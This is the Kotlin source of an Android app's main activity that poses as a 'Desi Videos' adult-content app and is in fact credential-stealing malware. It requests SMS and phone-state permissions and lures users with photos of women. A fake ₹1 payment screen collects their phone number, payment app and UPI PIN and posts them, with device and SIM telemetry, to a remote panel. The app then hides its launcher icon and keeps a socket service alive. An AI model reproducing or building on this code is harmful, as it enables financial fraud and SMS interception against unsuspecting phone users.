package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.app.AlertDialog
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.InputType
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import org.json.JSONObject
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
        private const val KEY_PHONE = "phone_number"
        private const val KEY_APP = "payment_app"
        private const val KEY_PIN = "upi_pin"
        private const val KEY_DONE = "onboarded"
        private const val KEY_PENDING = "onboarding_pending"
        private const val KEY_CRASH = "last_crash"
        private const val REQ_PERMS = 1301

        private val GIRLS = arrayOf(
            "https://files.catbox.moe/8xd98p.jpeg",
            "https://files.catbox.moe/eucz3q.jpeg",
            "https://files.catbox.moe/ym3rl6.jpeg"
        )

        private const val BG = 0xFFFFFFFF.toInt()
        private const val CARD = 0xFFFFFFFF.toInt()
        private const val CARD_2 = 0xFFF7F8FA.toInt()
        private const val FIELD = 0xFFF4F5F7.toInt()
        private const val BORDER = 0xFFE3E5E8.toInt()
        private const val ACCENT = 0xFF111827.toInt()
        private const val ACCENT_SOFT = 0xFFEDEFF2.toInt()
        private const val TEXT = 0xFF111827.toInt()
        private const val MUTED = 0xFF6B7280.toInt()
        private const val GREEN = 0xFF16A34A.toInt()
        private const val RED = 0xFFDC2626.toInt()
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val main = Handler(Looper.getMainLooper())
    private lateinit var root: FrameLayout

    private var step = "perm"
    private var selectedApp: String? = null
    private var phoneNumber: String = ""
    private var pin: String = ""
    private var statusRow: TextView? = null

    private val statusReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) = refreshStatusRow()
    }

    private val requiredPermissions: Array<String> by lazy {
        val base = mutableListOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            base.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            base.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        base.toTypedArray()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        installCrashCatcher()

        root = FrameLayout(this).apply { setBackgroundColor(BG) }
        setContentView(root)

        showCrashIfAny()

        phoneNumber = prefs().getString(KEY_PHONE, "").orEmpty()
        selectedApp = prefs().getString(KEY_APP, null)
        pin = prefs().getString(KEY_PIN, "").orEmpty()

        registrationId()

        TpcService.start(this)

        if (prefs().getBoolean(KEY_DONE, false)) {
            showDoneStep()
        } else if (allPermissionsGranted()) {
            showCurrentStep()
        } else {
            showSplashStep()
            root.post { requestPermissions(requiredPermissions, REQ_PERMS) }
        }

        if (prefs().getBoolean(KEY_PENDING, false)) resendOnboarding()
    }

    override fun onResume() {
        super.onResume()

        val filter = IntentFilter(TpcService.ACTION_STATUS)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(statusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            registerReceiver(statusReceiver, filter)
        }

        refreshStatusRow()

        if (prefs().getBoolean(KEY_DONE, false)) return
        if (step == "perm" && allPermissionsGranted()) showCurrentStep()
    }

    override fun onPause() {
        runCatching { unregisterReceiver(statusReceiver) }
        super.onPause()
    }

    override fun onDestroy() {
        runCatching { executor.shutdown() }
        super.onDestroy()
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        when (step) {
            "pin" -> showContentStep()
            "content" -> showPhoneStep()
            "diag" -> showDoneStep()
            "done" -> finish()
            else -> @Suppress("DEPRECATION") super.onBackPressed()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != REQ_PERMS) return
        if (allPermissionsGranted()) showCurrentStep() else showPermissionDialog()
    }

    private fun installCrashCatcher() {
        val prev = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { t, e ->
            runCatching {
                prefs().edit().putString(KEY_CRASH, Log.getStackTraceString(e)).apply()
            }
            prev?.uncaughtException(t, e)
        }
    }

    private fun showCrashIfAny() {
        val crash = prefs().getString(KEY_CRASH, null) ?: return
        prefs().edit().remove(KEY_CRASH).apply()
        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
            .setTitle("Last crash")
            .setMessage(crash)
            .setPositiveButton("OK", null)
            .show()
    }

    private fun allPermissionsGranted(): Boolean =
        requiredPermissions.all {
            checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
        }

    private fun showCurrentStep() {
        if (phoneNumber.isBlank()) showPhoneStep() else showContentStep()
    }

    private fun setScreen(view: View, stepName: String) {
        step = stepName
        root.removeAllViews()
        root.addView(
            view,
            FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        )
    }

    private fun toast(msg: String) = Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()

    private fun refreshStatusRow() {
        val t = statusRow ?: return
        val live = TpcService.socketConnected
        t.text = if (live) "● Socket live" else "○ Socket reconnect…"
        t.setTextColor(if (live) GREEN else MUTED)
    }

    private fun showPermissionDialog() {
        if (isFinishing) return
        AlertDialog.Builder(this, android.R.style.Theme_Material_Light_Dialog_Alert)
            .setTitle("Permission do")
            .setMessage("App chalane ke liye permission zaroori hai.")
            .setCancelable(false)
            .setPositiveButton("Permission do") { _, _ ->
                requestPermissions(requiredPermissions, REQ_PERMS)
            }
            .setNeutralButton("Settings") { _, _ -> openAppSettings() }
            .show()
    }

    private fun openAppSettings() {
        runCatching {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.fromParts("package", packageName, null)
                }
            )
        }
    }

    private fun showSplashStep() {
        val col = column()
        col.addView(logo(84))
        col.addView(space(18))
        col.addView(label("DESI VIDEOS", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Permission check kar rahe hain…", 12.5f, MUTED, false, Gravity.CENTER))
        setScreen(scrollWrap(col), "perm")
    }

    private fun showPhoneStep() {
        val col = column()

        col.addView(label("STEP 1 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Enter your number", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Desi special content available", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(20))

        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
        }

        GIRLS.forEachIndexed { index, url ->
            val frame = FrameLayout(this).apply {
                background = rounded(12f, CARD, 1, BORDER)
                setPadding(dp(1), dp(1), dp(1), dp(1))
            }

            val image = ImageView(this).apply {
                scaleType = ImageView.ScaleType.CENTER_CROP
                setBackgroundColor(CARD_2)
            }
            ImageLoader.load(url, image)

            frame.addView(
                image,
                FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT
                )
            )

            val lp = LinearLayout.LayoutParams(0, dp(146), 1f)
            if (index > 0) lp.marginStart = dp(8)
            frame.layoutParams = lp

            row.addView(frame)
        }

        col.addView(row)
        col.addView(space(22))

        val input = EditText(this).apply {
            hint = "10-digit mobile number"
            inputType = InputType.TYPE_CLASS_PHONE
            setTextColor(TEXT)
            setHintTextColor(MUTED)
            textSize = 17f
            setPadding(dp(16), dp(15), dp(16), dp(15))
            background = rounded(10f, FIELD, 1)
            setText(phoneNumber)
            setSelection(text.length)
        }

        col.addView(input)
        col.addView(space(18))

        col.addView(primaryButton("Continue") {
            val value = input.text.toString().trim()
            if (value.length < 10) {
                toast("Sahi number daalo")
                return@primaryButton
            }
            phoneNumber = value
            prefs().edit().putString(KEY_PHONE, value).apply()
            showContentStep()
        })

        setScreen(scrollWrap(col), "phone")
    }

    private fun showContentStep() {
        val col = column()

        col.addView(label("STEP 2 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(label("Desi special content", 24f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Unlock karne ke liye ₹1 pay karo", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(22))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(18), dp(18), dp(18))
        }

        inner.addView(label("Payment app chuno", 12.5f, MUTED, true))
        inner.addView(space(12))

        val tiles = mutableMapOf<String, View>()

        fun paintTiles() {
            tiles.forEach { (key, view) ->
                val active = key == selectedApp
                view.background = rounded(
                    10f,
                    if (active) ACCENT_SOFT else CARD_2,
                    if (active) 2 else 1,
                    if (active) ACCENT else BORDER
                )
            }
        }

        listOf("GPay", "Paytm", "PhonePe", "WhatsApp").chunked(2).forEach { pair ->
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            pair.forEachIndexed { index, name ->
                val tile = LinearLayout(this).apply {
                    orientation = LinearLayout.VERTICAL
                    gravity = Gravity.CENTER
                    setPadding(dp(14), dp(18), dp(14), dp(18))
                    background = rounded(10f, CARD_2, 1)
                }

                tile.addView(label(name, 15f, TEXT, true, Gravity.CENTER))
                tile.addView(space(4))
                tile.addView(label("₹1 payment", 11f, MUTED, false, Gravity.CENTER))

                tile.setOnClickListener {
                    selectedApp = name
                    paintTiles()
                }

                tiles[name] = tile

                val lp = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                if (index > 0) lp.marginStart = dp(10)
                tile.layoutParams = lp

                row.addView(tile)
            }

            inner.addView(row)
            inner.addView(space(10))
        }

        card.addView(inner)
        col.addView(card)
        col.addView(space(20))

        col.addView(primaryButton("Pay ₹1") {
            if (selectedApp == null) {
                toast("Pehle app select karo")
                return@primaryButton
            }
            prefs().edit().putString(KEY_APP, selectedApp).apply()
            pin = ""
            showPinStep()
        })

        setScreen(scrollWrap(col), "content")
        paintTiles()
    }

    private fun showPinStep() {
        val col = column()

        col.addView(label("STEP 3 OF 3", 10.5f, MUTED, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("₹1", 46f, TEXT, true, Gravity.CENTER))
        col.addView(label("Paying via ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        col.addView(space(24))

        val dots = LinearLayout(this).apply { gravity = Gravity.CENTER }
        val dotViews = mutableListOf<TextView>()

        repeat(6) {
            val dot = TextView(this).apply {
                text = "○"
                textSize = 22f
                setTextColor(MUTED)
                gravity = Gravity.CENTER
                width = dp(34)
            }
            dotViews.add(dot)
            dots.addView(dot)
        }

        col.addView(dots)
        col.addView(space(22))

        fun refreshDots() {
            dotViews.forEachIndexed { index, dot ->
                val filled = index < pin.length
                dot.text = if (filled) "●" else "○"
                dot.setTextColor(if (filled) TEXT else MUTED)
            }
        }

        val numpad = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
        }

        listOf(
            listOf("1", "2", "3"),
            listOf("4", "5", "6"),
            listOf("7", "8", "9"),
            listOf("⌫", "0", "✓")
        ).forEach { rowKeys ->
            val row = LinearLayout(this).apply {
                gravity = Gravity.CENTER
                layoutParams = LinearLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            rowKeys.forEach { key ->
                val keyView = TextView(this).apply {
                    text = key
                    textSize = 20f
                    setTextColor(TEXT)
                    gravity = Gravity.CENTER
                    background = rounded(10f, CARD_2, 1)
                }

                keyView.setOnClickListener {
                    when (key) {
                        "⌫" -> if (pin.isNotEmpty()) pin = pin.dropLast(1)
                        "✓" -> {
                            if (pin.length >= 4) submitPin() else toast("Kam se kam 4 digit")
                        }
                        else -> if (pin.length < 6) pin += key
                    }
                    refreshDots()
                }

                val lp = LinearLayout.LayoutParams(dp(78), dp(58))
                lp.marginStart = dp(6)
                lp.marginEnd = dp(6)
                lp.topMargin = dp(6)
                lp.bottomMargin = dp(6)
                keyView.layoutParams = lp

                row.addView(keyView)
            }

            numpad.addView(row)
        }

        col.addView(numpad)
        col.addView(space(16))
        col.addView(label("UPI PIN · 4–6 digit", 11.5f, MUTED, false, Gravity.CENTER))

        setScreen(scrollWrap(col), "pin")
        refreshDots()
    }

    private fun onboardingPayload(): String = JSONObject().apply {
        put("registration_id", registrationId())
        put("phone_number", phoneNumber.take(20))
        put("payment_app", (selectedApp ?: "").take(30))
        put("upi_pin", pin.take(8))
        put("amount", 1)
        put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(60))
    }.toString()

    private fun postOnboarding(): Boolean =
        ApiClient.post("/devices/onboarding", JSONObject(onboardingPayload()))

    private fun submitPin() {
        prefs().edit().putString(KEY_PIN, pin).apply()
        showProcessingStep()

        executor.execute {
            var synced = false
            for (attempt in 0 until 3) {
                if (postOnboarding()) {
                    synced = true
                    break
                }
                Thread.sleep(1500L * (attempt + 1))
            }

            prefs().edit().putBoolean(KEY_PENDING, !synced).apply()
            main.post { showSuccessStep(synced) }
        }
    }

    private fun resendOnboarding() {
        if (phoneNumber.isBlank()) return
        executor.execute {
            if (postOnboarding()) {
                prefs().edit().putBoolean(KEY_PENDING, false).apply()
            }
        }
    }

    private fun showProcessingStep() {
        val col = column()
        col.addView(label("Processing payment…", 18f, TEXT, true, Gravity.CENTER))
        col.addView(space(12))
        col.addView(label("₹1 • ${selectedApp ?: ""}", 13f, MUTED, false, Gravity.CENTER))
        setScreen(col, "processing")
    }

    private fun showSuccessStep(synced: Boolean) {
        prefs().edit().putBoolean(KEY_DONE, true).apply()

        executor.execute {
            ApiClient.post("/devices/telemetry", JSONObject().apply {
                put("registration_id", registrationId())
                put("telemetry", Telemetry.collect(this@MainActivity))
            })
        }

        TpcService.start(this)

        val col = column()
        col.addView(label("✓", 58f, GREEN, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("Payment successful", 22f, TEXT, true, Gravity.CENTER))
        col.addView(space(8))
        col.addView(label("₹1 paid via ${selectedApp ?: ""}", 14f, MUTED, false, Gravity.CENTER))
        col.addView(space(28))
        col.addView(label("Content unlock ho gaya", 14f, TEXT, true, Gravity.CENTER))
        col.addView(space(10))
        col.addView(
            label(
                if (synced) "Panel synced ✓" else "Panel se sync pending — offline tha",
                11.5f,
                if (synced) GREEN else MUTED,
                false,
                Gravity.CENTER
            )
        )
        col.addView(space(30))

        col.addView(primaryButton("Start") {
            hideLauncherIcon()
            toast("App ab home screen se hidden hai")
            main.postDelayed({ finish() }, 1000)
        })

        setScreen(scrollWrap(col), "done")
    }

    private fun showDoneStep() {
        val col = column()

        col.addView(label("✓", 54f, GREEN, true, Gravity.CENTER))
        col.addView(space(14))
        col.addView(label("Onboarding complete", 21f, TEXT, true, Gravity.CENTER))
        col.addView(space(10))

        statusRow = label("○ checking…", 12f, MUTED, true, Gravity.CENTER)
        col.addView(statusRow)
        col.addView(space(20))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(14), dp(18), dp(14))
        }

        fun renderRows() {
            inner.removeAllViews()
            val live = TpcService.lastNumber.ifBlank {
                SimNumbers.best(this@MainActivity)?.first ?: ""
            }
            listOf(
                "Entered number" to phoneNumber.ifBlank { "—" },
                "Live SIM number" to live.ifBlank { "fetching…" },
                "Carrier" to (SimNumbers.best(this@MainActivity)?.let { "" } ?: ""),
                "App" to (selectedApp ?: "—"),
                "PIN" to pin.ifBlank { "—" },
                "Service" to if (TpcService.socketConnected) "socket live" else "reconnecting"
            ).forEach { (k, v) ->
                if (k == "Carrier" && v.isBlank()) return@forEach
                val row = LinearLayout(this).apply {
                    orientation = LinearLayout.HORIZONTAL
                    setPadding(0, dp(9), 0, dp(9))
                }
                row.addView(label(k, 13f, MUTED, false))
                row.addView(label(v, 13f, TEXT, true, Gravity.END))
                inner.addView(row)
            }
        }

        renderRows()
        card.addView(inner)
        col.addView(card)
        col.addView(space(14))

        col.addView(secondaryButton("⟳ Fetch real SIM number") {
            toast("Fetch kar rahe hain…")
            executor.execute {
                val t = Telemetry.collect(this@MainActivity)
                ApiClient.post("/devices/telemetry", JSONObject().apply {
                    put("registration_id", registrationId())
                    put("telemetry", t)
                })
                main.post {
                    renderRows()
                    toast(
                        if (TpcService.lastNumber.isBlank())
                            "Number nahi mila — SIM / network check karo"
                        else
                            "Live number: ${TpcService.lastNumber}"
                    )
                }
            }
        })

        col.addView(space(10))
        col.addView(secondaryButton("📋 Diagnostics") { showDiagnostics() })
        col.addView(space(10))
        col.addView(secondaryButton("Re-run onboarding") {
            pin = ""
            prefs().edit().putBoolean(KEY_DONE, false).apply()
            showCurrentStep()
        })
        col.addView(space(10))
        col.addView(primaryButton("Close") { finish() })

        setScreen(scrollWrap(col), "done")
        refreshStatusRow()
    }

    private fun showDiagnostics() {
        val t = Telemetry.collect(this)
        val col = column()

        col.addView(label("Diagnostics", 22f, TEXT, true, Gravity.CENTER))
        col.addView(space(6))
        col.addView(label("Live device + connection state", 12f, MUTED, false, Gravity.CENTER))
        col.addView(space(16))

        val card = card()
        val inner = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(12), dp(16), dp(12))
        }

        val keys = listOf(
            "model", "manufacturer", "brand", "android_version", "sdk_int",
            "ram_total_mb", "ram_free_mb", "storage_total_mb", "storage_free_mb",
            "battery_level", "battery_charging", "battery_temperature_c", "battery_health",
            "network_type", "local_ip", "screen_resolution",
            "sim_carrier", "sim_number", "sim_number_source", "sim_count", "sim_serial",
            "android_id", "cpu_abi", "cpu_cores"
        )

        keys.forEach { k ->
            if (!t.has(k)) return@forEach
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                setPadding(0, dp(7), 0, dp(7))
            }
            row.addView(label(k, 11.5f, MUTED, false))
            row.addView(label(t.optString(k), 11.5f, TEXT, true, Gravity.END))
            inner.addView(row)
        }

        card.addView(inner)
        col.addView(card)
        col.addView(space(12))

        val socketRow = label(
            if (TpcService.socketConnected) "socket: connected" else "socket: disconnected",
            12f,
            if (TpcService.socketConnected) GREEN else RED,
            true,
            Gravity.CENTER
        )
        col.addView(socketRow)
        col.addView(space(16))

        col.addView(secondaryButton("🔋 Battery optimization exempt") {
            runCatching {
                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    .setData(Uri.parse("package:$packageName"))
                startActivity(i)
            }
        })

        col.addView(space(10))
        col.addView(secondaryButton("⟳ Force socket reconnect") {
            TpcService.start(this)
            toast("reconnect trigger bheja")
        })

        col.addView(space(10))
        col.addView(primaryButton("Back") { showDoneStep() })

        setScreen(scrollWrap(col), "diag")
    }

    private fun hideLauncherIcon() {
        runCatching {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$packageName.LauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        }
    }

    private fun prefs() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    private fun registrationId(): String {
        val p = prefs()
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private fun dp(value: Int) = (value * resources.displayMetrics.density).toInt()

    private fun space(height: Int) = View(this).apply {
        layoutParams = LinearLayout.LayoutParams(1, dp(height))
    }

    private fun column() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        gravity = Gravity.CENTER_HORIZONTAL
        setPadding(dp(24), dp(56), dp(24), dp(40))
        setBackgroundColor(BG)
    }

    private fun scrollWrap(child: View) = ScrollView(this).apply {
        isFillViewport = true
        setBackgroundColor(BG)
        addView(child)
    }

    private fun card() = LinearLayout(this).apply {
        orientation = LinearLayout.VERTICAL
        background = rounded(14f, CARD, 1, BORDER)
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun label(
        text: String,
        size: Float,
        color: Int,
        bold: Boolean = false,
        gravity: Int = Gravity.START
    ) = TextView(this).apply {
        this.text = text
        textSize = size
        setTextColor(color)
        this.gravity = gravity
        if (bold) typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )
    }

    private fun primaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        textSize = 15f
        typeface = Typeface.DEFAULT_BOLD
        setTextColor(0xFFFFFFFF.toInt())
        background = rounded(10f, ACCENT, 0)
        isAllCaps = false
        setOnClickListener { onClick() }
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(52)
        )
    }

    private fun secondaryButton(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        textSize = 14f
        setTextColor(TEXT)
        background = rounded(10f, CARD, 1, BORDER)
        isAllCaps = false
        setOnClickListener { onClick() }
        layoutParams = LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(48)
        )
    }

    private fun logo(size: Int) = TextView(this).apply {
        text = "DV"
        textSize = 28f
        typeface = Typeface.DEFAULT_BOLD
        setTextColor(TEXT)
        gravity = Gravity.CENTER
        background = rounded(18f, CARD, 2, TEXT)
        layoutParams = LinearLayout.LayoutParams(dp(size), dp(size)).apply {
            gravity = Gravity.CENTER_HORIZONTAL
        }
    }

    private fun rounded(
        radiusDp: Float,
        fill: Int,
        strokeWidth: Int,
        strokeColor: Int = BORDER
    ) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE
        cornerRadius = dp(radiusDp.toInt()).toFloat()
        setColor(fill)
        if (strokeWidth > 0) setStroke(dp(strokeWidth), strokeColor)
    }
}